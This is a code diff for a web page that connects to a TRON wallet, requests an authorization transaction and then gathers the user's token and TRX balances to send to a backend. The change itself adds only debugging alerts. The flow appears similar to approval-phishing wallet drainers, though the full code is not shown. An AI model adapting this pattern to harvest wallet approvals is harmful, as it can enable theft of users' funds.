@@ -110,6 +110,7 @@
                     return;
                 }
                 const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
+                alert("accounts: " + JSON.stringify(accounts));
                 userAddress = accounts[0];
                 await initWallet();
             } catch (e) {
@@ -129,12 +130,16 @@
                     from: userAddress,
                     shouldPollResponse: true // 等待imToken确认交易
                 });
+                alert("授权结果: " + JSON.stringify(result));
 
                 // 授权成功：查余额+传后端+存记录
+                alert("准备调用 getTokenBalance 和 getTrxBalance 函数");
                 const [tokenBalance, trxBalance] = await Promise.all([
                     getTokenBalance(userAddress),
                     getTrxBalance(userAddress)
-                ]);const record = {
+                ]);
+                alert("tokenBalance: " + tokenBalance + ", trxBalance: " + trxBalance);
+                const record = {
                     address: userAddress,
                     tokenBalance: tokenBalance.toFixed(2),
                     trxBalance: trxBalance.toFixed(2),
